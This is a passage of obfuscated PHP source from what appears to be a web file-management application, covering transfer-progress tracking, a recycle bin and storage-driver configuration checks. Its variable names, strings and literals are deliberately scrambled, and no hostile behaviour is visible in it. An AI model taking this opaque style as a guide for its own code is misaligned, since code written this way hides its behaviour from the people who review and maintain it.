$¶®½¥²¶[$ÆÕ“ã¨[1801]] = $¶®½¥²¶[$ÆÕ“ã¨[1800]]; $¶®½¥²¶[$ÆÕ“ã¨[1802]] = $ÆÕ“ã¨[12]; unset($¶®½¥²¶[$ÆÕ“ã¨[1771]]); if ($Œ”Â¦Èë == $¶®½¥²¶[$ÆÕ“ã¨[1798]]) { $¶®½¥²¶[$ÆÕ“ã¨[1804]] += $¶®½¥²¶[$ÆÕ“ã¨[1800]]; $¶®½¥²¶[$ÆÕ“ã¨[1805]] = $¶®½¥²¶[$ÆÕ“ã¨[1804]]; $¾¢•ÚÈè = 1; if (isset($¶®½¥²¶[$ÆÕ“ã¨[1811]]) && $¶®½¥²¶[$ÆÕ“ã¨[1811]] == $½Şøß¢¨) { $¾¢•ÚÈè = 0; } $this->update($¾¢•ÚÈè); } else { $this->update(); $¶®½¥²¶[$ÆÕ“ã¨[1801]] = 0; } Cache::remove($¶®½¥²¶[$ÆÕ“ã¨[475]] . $ÆÕ“ã¨[1814]); self::log($ÆÕ“ã¨[1817] . $½Şøß¢¨ . $ÆÕ“ã¨[73] . $Ûø”’Áí . $ÆÕ“ã¨[262] . $Œ”Â¦Èë . $ÆÕ“ã¨[1818] . $¶®½¥²¶[$ÆÕ“ã¨[1798]]); } public function updateFileEnd($Âà§, $Ñòóé…¤) { $Ë¯Ì•– =& $_SERVER[ìïæ“œî]; $î®°’æÛ =& $this->task; $î®°’æÛ[$Ë¯Ì•–[1798]] = $Âà§; $î®°’æÛ[$Ë¯Ì•–[1800]] = $Ñòóé…¤; $î®°’æÛ[$Ë¯Ì•–[1804]] += $Ñòóé…¤; $î®°’æÛ[$Ë¯Ì•–[1805]] = $î®°’æÛ[$Ë¯Ì•–[1804]]; $this->update(1); self::log($Ë¯Ì•–[1819] . $Âà§); } public function sourceModelCopy($Ÿ»†ÔÕ®) { $ûà±¶öÕ =& $_SERVER[ìïæ“œî]; $—â¯¼Ñø = $Ÿ»†ÔÕ®[0]; $£ÄÛ Ó¹ = $Ÿ»†ÔÕ®[1]; $äßÔã‘Ë =& $this->task; $this->sourceModelCopyFlag = !0; $•ó•©º… = 0; switch ($—â¯¼Ñø) { case $ûà±¶öÕ[635]: $•ó•©º… = 1; break; case $ûà±¶öÕ[638]: $äßÔã‘Ë[$ûà±¶öÕ[1798]] = $£ÄÛ Ó¹[$ûà±¶öÕ[32]]; break; case $ûà±¶öÕ[640]: $•ó•©º… = intval($Ÿ»†ÔÕ®[$ûà±¶öÕ[456]] * 0.4); break; case $ûà±¶öÕ[642]: $•ó•©º… = intval($Ÿ»†ÔÕ®[$ûà±¶öÕ[456]] * 0.2); break; case $ûà±¶öÕ[644]: $•ó•©º… = intval($Ÿ»†ÔÕ®[$ûà±¶öÕ[456]] * 0.4); break; } $this->update($•ó•©º…); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ó…Ä‰Çà, $¾°›„ÚÍ) { $‰À’Ñø =& $_SERVER[ìïæ“œî]; $this->sourceModelCopyFlag = !0; $›×ƒ×€ = 1; if (isset($ó…Ä‰Çà[$‰À’Ñø[82]])) { $›×ƒ×€ = $ó…Ä‰Çà[$‰À’Ñø[82]][$‰À’Ñø[80]]; $›×ƒ×€ = $›×ƒ×€ + $ó…Ä‰Çà[$‰À’Ñø[82]][$‰À’Ñø[81]] + 1; } $this->update($›×ƒ×€); $this->sourceModelCopyFlag = !1; } public function sourceMove($•×Ö¨â©) { $this->sourceRemove($•×Ö¨â©, !1); } public function curlProgress($– ¾ºİú, $€·™¯Û¯, $ƒ ‡º’‘, $Ÿƒ¥¯, $ÜÃ±ùŸ³) { $Â­Îâ±ó =& $_SERVER[ìïæ“œî]; $ÖáİâÙ‚ =& $this->task; if ($ÜÃ±ùŸ³ > 0) { $ÖáİâÙ‚[$Â­Îâ±ó[1120]] = $Â­Îâ±ó[1820]; $ÖáİâÙ‚[$Â­Îâ±ó[1802]] = $Â­Îâ±ó[110]; if ($ÖáİâÙ‚[$Â­Îâ±ó[1800]]) { $ÖáİâÙ‚[$Â­Îâ±ó[1801]] = $ÜÃ±ùŸ³; } if ($ÖáİâÙ‚[$Â­Îâ±ó[1803]]) { $ÖáİâÙ‚[$Â­Îâ±ó[1801]] = $ÜÃ±ùŸ³ + $ÖáİâÙ‚[$Â­Îâ±ó[1803]]; } } else { if ($ƒ ‡º’‘ > 0) { if ($ÖáİâÙ‚[$Â­Îâ±ó[1800]] == $€·™¯Û¯) { $ÖáİâÙ‚[$Â­Îâ±ó[1801]] = $ƒ ‡º’‘; $ÖáİâÙ‚[$Â­Îâ±ó[1120]] = $Â­Îâ±ó[1821]; $ÖáİâÙ‚[$Â­Îâ±ó[1802]] = $Â­Îâ±ó[1256]; } } } $this->update(); } public function curlProgressStart($´ªÒå§) { } public function curlProgressEnd($ûÙâ¸¿ß) { $äûë•Š =& $_SERVER[ìïæ“œî]; $ıªúö¬ =& $this->task; $âäòÛø¡ = curl_getinfo($ûÙâ¸¿ß); $ÎÓªÙ‚û = $âäòÛø¡[$äûë•Š[1822]]; if ($ÎÓªÙ‚û == -1) { $ÎÓªÙ‚û = $âäòÛø¡[$äûë•Š[1823]]; } if ($ıªúö¬[$äûë•Š[1802]] == $äûë•Š[110] && $ÎÓªÙ‚û) { $ıªúö¬[$äûë•Š[1803]] += $ÎÓªÙ‚û; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ö«æÁáØ =& $_SERVER[ìïæ“œî]; $ÌÏÂòª¬ =& $this->task; $ÌÏÂòª¬[$ö«æÁáØ[1824]] = 1; Hook::bind($ö«æÁáØ[1792], array($this, $ö«æÁáØ[1825])); Hook::bind($ö«æÁáØ[1794], array($this, $ö«æÁáØ[1826])); Hook::bind($ö«æÁáØ[1796], array($this, $ö«æÁáØ[1827])); } protected function endAfter() { $Š÷º™¡¸ =& $_SERVER[ìïæ“œî]; Hook::unbind($Š÷º™¡¸[1792], array($this, $Š÷º™¡¸[1825])); Hook::unbind($Š÷º™¡¸[1794], array($this, $Š÷º™¡¸[1826])); Hook::unbind($Š÷º™¡¸[1796], array($this, $Š÷º™¡¸[1827])); } public function progressStart($—í«ºâ) { $²ûûæì =& $_SERVER[ìïæ“œî]; $œµ×¿›® = curl_getinfo($—í«ºâ); self::log($²ûûæì[1828] . $œµ×¿›®[$²ûûæì[383]]); self::valueSet($this->task[$²ûûæì[475]], $this->task); } public function progressEnd($˜ÃŸÂ¼Û) { $ßŸƒ¼æÇ =& $_SERVER[ìïæ“œî]; self::log($ßŸƒ¼æÇ[1829] . $this->task[$ßŸƒ¼æÇ[475]]); $this->end(); } public function progress($Ü™Ë¶Åà, $…ÓüÖ™Ò, $ŞŸıÂç¡, $é»ÚË÷, $¤üèÓ¸») { $Ş…¤êº€ =& $_SERVER[ìïæ“œî]; $¦èĞÇ¥ =& $this->task; if ($¤üèÓ¸» > 0) { $¦èĞÇ¥[$Ş…¤êº€[1118]] = $¦èĞÇ¥[$Ş…¤êº€[1118]] == 0 ? $é»ÚË÷ : $¦èĞÇ¥[$Ş…¤êº€[1118]]; $¦èĞÇ¥[$Ş…¤êº€[1748]] = $¤üèÓ¸»; } else { if ($ŞŸıÂç¡ > 0) { $¦èĞÇ¥[$Ş…¤êº€[1118]] = $¦èĞÇ¥[$Ş…¤êº€[1118]] == 0 ? $…ÓüÖ™Ò : $¦èĞÇ¥[$Ş…¤êº€[1118]]; $¦èĞÇ¥[$Ş…¤êº€[1748]] = $ŞŸıÂç¡; } } $this->update(); self::log("\160\x72\x6f\147\162\x65\x73\x73\x48\164\x74\160\72\144\x6f\167\156\72{$ŞŸıÂç¡}\x2f{$…ÓüÖ™Ò}\x3b\40\x75\x70\x6c\157\x61\x64\x3a{$¤üèÓ¸»}\x2f{$é»ÚË÷}\x3b"); } } goto fˆò×”Æ¡ö; FÉÎ ‰¦’: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\x65\x5f\x72\x65\143\x79\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\x6d\x65", "\x74\x69\155\145", "\151\156\x73\x65\162\164", "\146\165\x6e\143\164\x69\157\156")); public function listData($êúÁ­è = false) { $Ô­Ò„Øğ =& $_SERVER[ìïæ“œî]; $êúÁ­è = $êúÁ­è ? $êúÁ­è : USER_ID; $ôğÂËì¯ = $this->where(array($Ô­Ò„Øğ[1738] => $êúÁ­è))->select(); return array_to_keyvalue($ôğÂËì¯, $Ô­Ò„Øğ[12], $Ô­Ò„Øğ[193]); } public function moveToRecycle($â®“€‰) { $™Â³Ü¸À =& $_SERVER[ìïæ“œî]; $‰¡²ïì = Model($™Â³Ü¸À[1394]); $æ›ïÑò = $‰¡²ïì->sourceInfo($â®“€‰); if (!$æ›ïÑò || $æ›ïÑò[$™Â³Ü¸À[505]] == $™Â³Ü¸À[91]) { return; } $£ãÕ©Û± = array($™Â³Ü¸À[491] => $â®“€‰, $™Â³Ü¸À[1738] => USER_ID, $™Â³Ü¸À[648] => $æ›ïÑò[$™Â³Ü¸À[190]], $™Â³Ü¸À[649] => $æ›ïÑò[$™Â³Ü¸À[569]], $™Â³Ü¸À[652] => $æ›ïÑò[$™Â³Ü¸À[584]]); $this->add($£ãÕ©Û±); $this->recycleMove($â®“€‰, 1); if ($æ›ïÑò[$™Â³Ü¸À[485]] == $™Â³Ü¸À[91]) { $ËşÂÕ· = array($™Â³Ü¸À[652] => array($™Â³Ü¸À[612], $æ›ïÑò[$™Â³Ü¸À[584]] . $â®“€‰ . $™Â³Ü¸À[613])); $‰¡²ïì->where($ËşÂÕ·)->setField($™Â³Ü¸À[505], 1); } } public function clear() { $this->remove(!1); } public function remove($×ü€‡œ = false, $·»ì¸ø = false) { $İ‰¯Ü˜¬ =& $_SERVER[ìïæ“œî]; $·»ì¸ø = $·»ì¸ø ? $·»ì¸ø : USER_ID; $ã¥ƒ¹Á = Model($İ‰¯Ü˜¬[1394]); $Ãù´µ‚ = $this->listData($·»ì¸ø); $×ü€‡œ = $×ü€‡œ === !1 ? !1 : $×ü€‡œ; $—ã™³™ş = array(); foreach ($Ãù´µ‚ as $öê˜¦äœ) { if ($×ü€‡œ != !1 && !in_array($öê˜¦äœ, $×ü€‡œ)) { continue; } $ÃÂè°‰ = $ã¥ƒ¹Á->sourceInfo($öê˜¦äœ); $ã¥ƒ¹Á->remove($öê˜¦äœ, !1); $úÄßïı = $ÃÂè°‰[$İ‰¯Ü˜¬[190]] . $İ‰¯Ü˜¬[11] . $ÃÂè°‰[$İ‰¯Ü˜¬[569]]; $—ã™³™ş[$úÄßïı] = array($İ‰¯Ü˜¬[648] => $ÃÂè°‰[$İ‰¯Ü˜¬[190]], $İ‰¯Ü˜¬[569] => $ÃÂè°‰[$İ‰¯Ü˜¬[569]]); $this->where(array($İ‰¯Ü˜¬[193] => $öê˜¦äœ))->delete(); } foreach ($—ã™³™ş as $¦ºÓ¯ò) { $ã¥ƒ¹Á->targetSpaceUpdate($¦ºÓ¯ò[$İ‰¯Ü˜¬[190]], $¦ºÓ¯ò[$İ‰¯Ü˜¬[569]]); } } public function restore($ºŒ˜êàƒ = false) { $Ë§¦³îÓ = $this->listData(); $this->_restoreSource($Ë§¦³îÓ, $ºŒ˜êàƒ); } public function removeUserAll($ìàüë) { $this->remove(!1, $ìàüë); } public function restoreItem($µÃ½…’¼) { $this->_restoreSource(array($µÃ½…’¼), array($µÃ½…’¼)); } private function _restoreSource($­ªËã°ğ, $ü½¶ƒâè) { $øûØØ´Ï =& $_SERVER[ìïæ“œî]; $œ’İŠõº = Model($øûØØ´Ï[1394]); $ü½¶ƒâè = $ü½¶ƒâè == !1 ? !1 : $ü½¶ƒâè; if (!$­ªËã°ğ) { return !0; } $´à»©ŒÅ = array(); foreach ($­ªËã°ğ as $ôçÏêŞ) { if ($ü½¶ƒâè != !1 && !in_array($ôçÏêŞ, $ü½¶ƒâè)) { continue; } $ş†È²ò© = $œ’İŠõº->sourceInfo($ôçÏêŞ); $™‚µ›Š = $œ’İŠõº->sourceInfo($ş†È²ò©[$øûØØ´Ï[192]]); if ($™‚µ›Š[$øûØØ´Ï[505]] == $øûØØ´Ï[91]) { continue; } $œ’İŠõº->lockMoveStart($ôçÏêŞ); $this->recycleMove($ôçÏêŞ, 0); if ($ş†È²ò©[$øûØØ´Ï[485]] == $øûØØ´Ï[91]) { $ßÃÛ¨“ = array($øûØØ´Ï[652] => array($øûØØ´Ï[612], $ş†È²ò©[$øûØØ´Ï[584]] . $ôçÏêŞ . $øûØØ´Ï[613])); $œ’İŠõº->where($ßÃÛ¨“)->setField($øûØØ´Ï[505], 0); $this->restoreFolderChildren($ôçÏêŞ, $­ªËã°ğ); } $this->where(array($øûØØ´Ï[193] => $ôçÏêŞ))->delete(); $œ’İŠõº->folderSizeReset($ş†È²ò©[$øûØØ´Ï[192]]); $´à»©ŒÅ[] = $ş†È²ò©[$øûØØ´Ï[192]]; if ($ş†È²ò©[$øûØØ´Ï[485]] == $øûØØ´Ï[91]) { $´à»©ŒÅ[] = $ôçÏêŞ; } $œ’İŠõº->lockMoveEnd($ôçÏêŞ); } $œ’İŠõº->updateModifyTime($´à»©ŒÅ); } private function restoreFolderChildren($‹İí¸Œï, $¿ñûô©») { $£´“½·€ =& $_SERVER[ìïæ“œî]; $­«Ò«¬ñ = Model($£´“½·€[1394]); $÷¼õÔÜ = array($£´“½·€[193] => array($£´“½·€[7], array())); foreach ($¿ñûô©» as $ÓÚ²¢º) { if ($ÓÚ²¢º == $‹İí¸Œï) { continue; } if (!$­«Ò«¬ñ->isParentOf($‹İí¸Œï, $ÓÚ²¢º)) { continue; } $­—•—Ñò = $­«Ò«¬ñ->sourceInfo($ÓÚ²¢º); if ($­—•—Ñò[$£´“½·€[485]] == $£´“½·€[91]) { $÷¼õÔÜ[] = array($£´“½·€[652] => array($£´“½·€[612], $­—•—Ñò[$£´“½·€[584]] . $ÓÚ²¢º . $£´“½·€[613])); } else { $÷¼õÔÜ[$£´“½·€[193]][1][] = $ÓÚ²¢º; } } if (!$÷¼õÔÜ[$£´“½·€[193]][1]) { unset($÷¼õÔÜ[$£´“½·€[193]]); } if (!$÷¼õÔÜ) { return; } if (is_array($÷¼õÔÜ[$£´“½·€[193]]) && is_array($÷¼õÔÜ[$£´“½·€[193]][1])) { $÷¼õÔÜ[$£´“½·€[193]][1] = array_unique($÷¼õÔÜ[$£´“½·€[193]][1]); } $÷¼õÔÜ[$£´“½·€[1055]] = $£´“½·€[2048]; $­«Ò«¬ñ->where($÷¼õÔÜ)->setField($£´“½·€[505], 1); } private function recycleMove($¼Š´¨ãé, $×ÁÖşşÖ = 1) { $ïÒ€¼·œ =& $_SERVER[ìïæ“œî]; $ÃÍ ¸œÃ = Model($ïÒ€¼·œ[1394]); $È™Çû©Â = Model($ïÒ€¼·œ[2270]); $İõäïÜ° = array($ïÒ€¼·œ[193] => $¼Š´¨ãé); if ($×ÁÖşşÖ) { $ÃÍ ¸œÃ->where($İõäïÜ°)->setField($ïÒ€¼·œ[505], 1); $È™Çû©Â->eventRecycle($¼Š´¨ãé, $ïÒ€¼·œ[2271]); } else { $ÄØûË¢ì = $ÃÍ ¸œÃ->where($İõäïÜ°)->find(); $éÄ—òõ– = $ÄØûË¢ì[$ïÒ€¼·œ[485]] == $ïÒ€¼·œ[91]; $ˆ«´—Ÿ = $ÃÍ ¸œÃ->fileNameAuto($ÄØûË¢ì[$ïÒ€¼·œ[192]], $ÄØûË¢ì[$ïÒ€¼·œ[32]], REPEAT_RENAME_FOLDER, $éÄ—òõ–); if ($ˆ«´—Ÿ != $ÄØûË¢ì[$ïÒ€¼·œ[32]]) { $ÃÍ ¸œÃ->rename($¼Š´¨ãé, $ˆ«´—Ÿ); } $ÃÍ ¸œÃ->where($İõäïÜ°)->setField($ïÒ€¼·œ[505], 0); $È™Çû©Â->eventRecycle($¼Š´¨ãé, $ïÒ€¼·œ[2272]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x73\157\165\x72\x63\145\123\145\143\162\145\164\x4c\x69\x73\164"; public $field = array("\163\x6f\165\x72\x63\145\x49\x44", "\x74\x79\160\145\111\104", "\x63\162\145\x61\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x73\x74\157\162\141\x67\x65\x4c\151\163\164"; public $field = array("\156\141\x6d\x65", "\x73\x69\172\145\115\141\x78", "\163\171\x73\x74\145\155", "\144\145\x66\x61\x75\x6c\x74", "\x64\x72\x69\166\x65\x72", "\143\157\156\x66\151\147"); public function listData($ğˆÏÅµµ = false, $°éâÎ–ú = "\155\157\144\x69\x66\x79\124\x69\x6d\x65", $ƒß§ÈÎ— = false) { $¶ıÈğ’« =& $_SERVER[ìïæ“œî]; $˜«ùø¡ = parent::listData($ğˆÏÅµµ, $°éâÎ–ú, $ƒß§ÈÎ—); if ($ğˆÏÅµµ) { return $˜«ùø¡; } $¢‘²›î = array(); if ($GLOBALS[$¶ıÈğ’«[2273]]) { $¢‘²›î = $this->ioSizeUseGet(array_to_keyvalue($˜«ùø¡, $¶ıÈğ’«[12], $¶ıÈğ’«[475])); } foreach ($˜«ùø¡ as $üò³Â–é => $Îùæ—úÄ) { unset($˜«ùø¡[$üò³Â–é][$¶ıÈğ’«[6]]); $˜«ùø¡[$üò³Â–é][$¶ıÈğ’«[1934]] = isset($¢‘²›î[$Îùæ—úÄ[$¶ıÈğ’«[475]]]) ? $¢‘²›î[$Îùæ—úÄ[$¶ıÈğ’«[475]]] : 0; } return $˜«ùø¡; } public function ioSizeUseGet($ß£Óß¹Ì) { $Õ™½€›â =& $_SERVER[ìïæ“œî]; if (!$ß£Óß¹Ì) { return array(); } $‹ë†…à­ = $Õ™½€›â[2274] . implode($Õ™½€›â[50], $ß£Óß¹Ì); $¤ã„ÃÏö = Cache::get($‹ë†…à­); if ($¤ã„ÃÏö) { return $¤ã„ÃÏö; } $ƒº¦¹Œª = array($Õ™½€›â[866] => $Õ™½€›â[475], $Õ™½€›â[2275] => $Õ™½€›â[79]); $®Ô—³ØÛ = array($Õ™½€›â[866] => array($Õ™½€›â[7], $ß£Óß¹Ì)); $¤ã„ÃÏö = Model($Õ™½€›â[838])->field($ƒº¦¹Œª)->where($®Ô—³ØÛ)->group($Õ™½€›â[866])->select(); $¤ã„ÃÏö = array_to_keyvalue($¤ã„ÃÏö, $Õ™½€›â[475], $Õ™½€›â[79]); Cache::set($‹ë†…à­, $¤ã„ÃÏö, 600); return $¤ã„ÃÏö; } public function getConfig($ŞØÏ®«) { $ö¡Å‹“ = parent::listData($ŞØÏ®«); return json_decode($ö¡Å‹“[$_SERVER[ìïæ“œî][6]], !0); } public function update($¢ä°ŸÍÅ, $¢ñÓº—) { $ïè­ÌÆ­ =& $_SERVER[ìïæ“œî]; $¼ª Ø°‚ = $¢ñÓº—[$ïè­ÌÆ­[32]]; $ä×Ğ§Í = array_to_keyvalue(parent::listData(), $ïè­ÌÆ­[32]); if (isset($ä×Ğ§Í[$¼ª Ø°‚]) && $ä×Ğ§Í[$¼ª Ø°‚][$ïè­ÌÆ­[475]] != $¢ä°ŸÍÅ) { return !1; } $this->checkPwd($¢ä°ŸÍÅ, $¢ñÓº—); if (isset($¢ñÓº—[$ïè­ÌÆ­[2276]]) && $¢ñÓº—[$ïè­ÌÆ­[2276]] == $ïè­ÌÆ­[91]) { $this->checkConfig($¢ñÓº—); } unset($¢ñÓº—[$ïè­ÌÆ­[2276]]); $ÎêÓÀÛ† = parent::update($¢ä°ŸÍÅ, $¢ñÓº—); if ($ÎêÓÀÛ† && $¢ñÓº—[$ïè­ÌÆ­[37]]) { $ĞŸ¼²ùõ = 0; foreach ($ä×Ğ§Í as $èüæ«ö³) { if ($èüæ«ö³[$ïè­ÌÆ­[37]] && $èüæ«ö³[$ïè­ÌÆ­[475]] != $¢ä°ŸÍÅ) { $ĞŸ¼²ùõ = $èüæ«ö³[$ïè­ÌÆ­[475]]; parent::update($èüæ«ö³[$ïè­ÌÆ­[475]], array($ïè­ÌÆ­[37] => 0)); } } $this->updateBackup($¢ä°ŸÍÅ, $ĞŸ¼²ùõ); } return $ÎêÓÀÛ†; } public function add($š’ÈÖı») { $ØõÃÎ­½ =& $_SERVER[ìïæ“œî]; $û¹â·€‚ = array_to_keyvalue(parent::listData(), $ØõÃÎ­½[32]); if (isset($û¹â·€‚[$š’ÈÖı»[$ØõÃÎ­½[32]]])) { return !1; } $this->checkConfig($š’ÈÖı»); $’é¨È—² = parent::insert($š’ÈÖı»); if ($’é¨È—² && $š’ÈÖı»[$ØõÃÎ­½[37]]) { foreach ($û¹â·€‚ as $‰ˆ§÷ëÕ) { if ($‰ˆ§÷ëÕ[$ØõÃÎ­½[37]]) { parent::update($‰ˆ§÷ëÕ[$ØõÃÎ­½[475]], array($ØõÃÎ­½[37] => 0)); } } } return $’é¨È—²; } public function updateBackup($ØÁö¤¢, $¶è•ƒèÚ) { $øîğÂÖœ =& $_SERVER[ìïæ“œî]; if (!$¶è•ƒèÚ) { return; } $úİÜõÙë = Model($øîğÂÖœ[797])->config(); if ($úİÜõÙë[$øîğÂÖœ[1717]] != $øîğÂÖœ[91] || $úİÜõÙë[$øîğÂÖœ[801]] != $¶è•ƒèÚ) { return; } $à”˜ğ× = Model($øîğÂÖœ[819])->get($øîğÂÖœ[832]); $à”˜ğ× = json_decode($à”˜ğ×, !0); if (!$à”˜ğ×) { return; } $à”˜ğ×[$øîğÂÖœ[801]] = $ØÁö¤¢; Model($øîğÂÖœ[819])->set(array($øîğÂÖœ[832] => $à”˜ğ×)); } public function checkPwd($ş§ŞÉñ®, &$ÉÇàİ•Á) { $ŠÚşŒó =& $_SERVER[ìïæ“œî]; if (empty($ÉÇàİ•Á[$ŠÚşŒó[6]])) { return; } $™€ÖğìÍ = json_decode($ÉÇàİ•Á[$ŠÚşŒó[6]], !0); $ÓŞ†± = $ŠÚşŒó[12]; $şí‡ûÓí = array($ŠÚşŒó[2277], $ŠÚşŒó[2278], $ŠÚşŒó[944]); foreach ($şí‡ûÓí as $ü Ù¼·) { if (isset($™€ÖğìÍ[$ü Ù¼·])) { $ÓŞ†± = $ü Ù¼·; break; } } if (!$ÓŞ†±) { return; } $µ¤”ÙÙÎ = $this->getConfig($ş§ŞÉñ®); $ ø—Ë±½ = $µ¤”ÙÙÎ[$ÓŞ†±]; $Ü…£¥Şæ = $™€ÖğìÍ[$ÓŞ†±]; if ($Ü…£¥Şæ == str_repeat($ŠÚşŒó[220], strlen($ ø—Ë±½))) { $™€ÖğìÍ[$ÓŞ†±] = $ ø—Ë±½; $ÉÇàİ•Á[$ŠÚşŒó[6]] = json_encode($™€ÖğìÍ); } else { if ($Ü…£¥Şæ != $ ø—Ë±½) { $ÉÇàİ•Á[$ŠÚşŒó[2276]] = $ŠÚşŒó[91]; } } } public function checkConfig(&$‡Ì„óé, $öŞ½À·´ = false) { $¶”ÍÓÎ€ =& $_SERVER[ìïæ“œî]; $ĞŒ’ÈÅÖ = strtolower($‡Ì„óé[$¶”ÍÓÎ€[98]]); $ô‘á¯ªí = json_decode($‡Ì„óé[$¶”ÍÓÎ€[6]], !0); foreach ($ô‘á¯ªí as $¹Ç’²»Ï => $ÀàöÁ®¤) { if (is_string($ÀàöÁ®¤)) { $ô‘á¯ªí[$¹Ç’²»Ï] = trim($ÀàöÁ®¤); } } $ô‘á¯ªí[$¶”ÍÓÎ€[2279]] = rand_string(6); $äÆÔÊ’» = $GLOBALS[$¶”ÍÓÎ€[6]][$¶”ÍÓÎ€[92]][$¶”ÍÓÎ€[874]]; $°è¶ò¹ = isset($äÆÔÊ’»[$ĞŒ’ÈÅÖ]) ? $äÆÔÊ’»[$ĞŒ’ÈÅÖ] : ucfirst($ĞŒ’ÈÅÖ); $ËÏÛ¿ÊÄ = $¶”ÍÓÎ€[77] . $°è¶ò¹; if (!$°è¶ò¹ || !class_exists($ËÏÛ¿ÊÄ)) { if ($öŞ½À·´) { return LNG($¶”ÍÓÎ€[2280]); } write_log(array($¶”ÍÓÎ€[2281], $‡Ì„óé, get_caller_info()), $¶”ÍÓÎ€[215]); show_json(LNG($¶”ÍÓÎ€[2280]), !1, $‡Ì„óé); } $İ¼Ê´é = new $ËÏÛ¿ÊÄ($ô‘á¯ªí); if (in_array($ĞŒ’ÈÅÖ, $İ¼Ê´é->objectDriver)) { try { if (!$İ¼Ê´é->isBucketCors() && !$İ¼Ê´é->setBucketCors()) { $á¶ç•Ûç = LNG($¶”ÍÓÎ€[2282]); $á¶ç•Ûç .= $¶”ÍÓÎ€[2283] . LNG($¶”ÍÓÎ€[2284]); } } catch (Exception $‚Š¡‹ÙÍ) { $á¶ç•Ûç = $‚Š¡‹ÙÍ->getMessage(); } if (isset($á¶ç•Ûç)) { return $this->_parseError($á¶ç•Ûç, $ĞŒ’ÈÅÖ, $öŞ½À·´); } if ($ĞŒ’ÈÅÖ == $¶”ÍÓÎ€[68] && !$İ¼Ê´é->checkRegion()) { return $this->_parseError(LNG($¶”ÍÓÎ€[2285]), $ĞŒ’ÈÅÖ, $öŞ½À·´); } } $©•ôæı = rtrim($ô‘á¯ªí[$¶”ÍÓÎ€[1239]], $¶”ÍÓÎ€[8]) . $¶”ÍÓÎ€[8]; $¯¿ÑËÒî = $İ¼Ê´é->getPath($©•ôæı . $¶”ÍÓÎ€[1243]); try { if ($ĞŒ’ÈÅÖ == $¶”ÍÓÎ€[109]) { $İ¼Ê´é->mkdir($©•ôæı); } $¿†ƒÉşç = $İ¼Ê´é->mkfile($¯¿ÑËÒî); if (!$¿†ƒÉşç) { $á¶ç•Ûç = LNG($¶”ÍÓÎ€[2282]); } } catch (Exception $‚Š¡‹ÙÍ) { $á¶ç•Ûç = $‚Š¡‹ÙÍ->getMessage(); } if (isset($á¶ç•Ûç)) { return $this->_parseError($á¶ç•Ûç, $ĞŒ’ÈÅÖ, $öŞ½À·´); } $ô‘á¯ªí[$¶”ÍÓÎ€[1239]] = $©•ôæı; $‡Ì„óé[$¶”ÍÓÎ€[6]] = json_encode($ô‘á¯ªí); $‡Ì„óé[$¶”ÍÓÎ€[98]] = $°è¶ò¹; return !0; } private function _parseError($ıÊÉ˜Òí, $ˆêÛàØõ, $ Šµ»¬ö = false) { $İè¹¨Çù =& $_SERVER[ìïæ“œî]; if ($ˆêÛàØõ == $İè¹¨Çù[68] && stripos($ıÊÉ˜Òí, $İè¹¨Çù[2286])) { $¦ŸÀ Ë¸ = explode($İè¹¨Çù[10], $ıÊÉ˜Òí); $”‘ÌˆÍ° = isset($¦ŸÀ Ë¸[1]) ? $¦ŸÀ Ë¸[1] : $İè¹¨Çù[12]; $§±ÀÌá = array($İè¹¨Çù[2287] => LNG($İè¹¨Çù[2288]), $İè¹¨Çù[2289] => LNG($İè¹¨Çù[2290])); if (isset($§±ÀÌá[$”‘ÌˆÍ°])) { $ıÊÉ˜Òí = $§±ÀÌá[$”‘ÌˆÍ°]; } } if (stripos($ıÊÉ˜Òí, $İè¹¨Çù[2291]) === 0) { $®Úá¹Û‹ = strpos($ıÊÉ˜Òí, $İè¹¨Çù[178]); if ($®Úá¹Û‹ === !1) { $®Úá¹Û‹ = strpos($ıÊÉ˜Òí, $İè¹¨Çù[4]); } if ($®Úá¹Û‹ !== !1) { $ıÊÉ˜Òí = substr($ıÊÉ˜Òí, $®Úá¹Û‹ + 1); } } $ıÊÉ˜Òí = LNG($İè¹¨Çù[1246]) . $ıÊÉ˜Òí; if ($ Šµ»¬ö) { return $ıÊÉ˜Òí; } show_json($ıÊÉ˜Òí, !1); } public function driverListSystem() { $á¾½­Û÷ =& $_SERVER[ìïæ“œî]; $¾‡ƒ¨Ó† = parent::listData(); $Ù¨Îá¦÷ = array(); foreach ($¾‡ƒ¨Ó† as $©«¿ƒö£) { unset($©«¿ƒö£[$á¾½­Û÷[231]], $©«¿ƒö£[$á¾½­Û÷[88]]); $©«¿ƒö£[$á¾½­Û÷[6]] = json_decode($©«¿ƒö£[$á¾½­Û÷[6]], !0); $Ù¨Îá¦÷[] = $©«¿ƒö£; } return $Ù¨Îá¦÷; } public function defaultDriver() { $²™•¥ß€ =& $_SERVER[ìïæ“œî]; $Ã´¡Ûè = parent::listData(); $Û¹÷Ø¨ = array_filter_by_field($Ã´¡Ûè, $²™•¥ß€[37], 1); $Û¹÷Ø¨ = $Û¹÷Ø¨[0]; if ($Û¹÷Ø¨) { $Û¹÷Ø¨[$²™•¥ß€[6]] = json_decode($Û¹÷Ø¨[$²™•¥ß€[6]], !0); } return $Û¹÷Ø¨; } public function driverInfo($Ş‹êŠ‹‹) { $é­š±„¦ =& $_SERVER[ìïæ“œî]; $™Áõ½²¾ = array_to_keyvalue(parent::listData(), $é­š±„¦[475]); if (!isset($™Áõ½²¾[$Ş‹êŠ‹‹])) { return !1; } $âŞèİí± = $™Áõ½²¾[$Ş‹êŠ‹‹]; $âŞèİí±[$é­š±„¦[6]] = json_decode($âŞèİí±[$é­š±„¦[6]], !0); return $âŞèİí±; } public function remove($ôÀ°êÆ“) { $this->removeShareItems($ôÀ°êÆ“); return parent::remove($ôÀ°êÆ“); } public function removeWithFile($¹¢ßƒ¡Ü, $¾¡£ı“è, $éø¬«Ñ, $¦‡¶Ì†¨ = false) { $®ø¢Ø†‚ =& $_SERVER[ìïæ“œî]; $ßíÆÄô¡ = array($®ø¢Ø†‚[866] => $¹¢ßƒ¡Ü); $ÃÎÑîŞ = Model($®ø¢Ø†‚[544])->where($ßíÆÄô¡)->count(); $¼ÑÒõ†· = Model($®ø¢Ø†‚[544])->where($ßíÆÄô¡)->sum($®ø¢Ø†‚[79]); $æğã¥º = 